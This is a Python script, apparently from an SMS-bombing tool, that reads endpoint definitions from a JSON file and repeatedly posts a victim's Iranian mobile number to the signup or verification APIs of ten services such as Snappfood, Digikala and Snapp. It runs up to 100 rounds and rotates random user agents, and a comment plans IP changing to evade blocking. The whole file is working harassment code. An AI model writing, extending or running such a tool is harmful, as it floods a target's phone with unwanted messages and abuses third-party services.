# packages
import requests
import random
import json
import re

from fake_useragent import UserAgent

range_n_limit = 100
services = ['rirabook', 'kellowear', 'snappfood', 'snapp', 'SMS.ir', 'vipshop', 'digikala', 'bamiloshop', 'banimode', 'doctoreto']


def validate_phone_number(phone_number):
    pattern = r'^09\d{9}$'
    return re.match(pattern, phone_number) is not None


def send(phone_number, range_n):  # add prvity Change IP

    # Validate phone number
    if not phone_number:
        print("Invalid Phone number")
        return

    # Load lib/API/sms.json
    with open('./lib/API/sms.json') as json_file:
        loaded_json = json.load(json_file)

    if int(range_n) <= range_n_limit:
        for i in range(1, int(range_n) + 1):

            # +_+_+_+ User Agent Generator +_+_+_+
            ua = UserAgent()
            headers = {'User-Agent': ua.random}

            for service in services:
                url_data = loaded_json[service]
                url = url_data['url']
                req_data = url_data.get('data', {})

                if isinstance(req_data, dict):
                    req_data = json.dumps(req_data)

                req_data = req_data.replace('numnum', phone_number)

                req = requests.post(url=url, data=req_data, headers=headers)

                print(req)
    else:
        print('Send Range Limit 100')
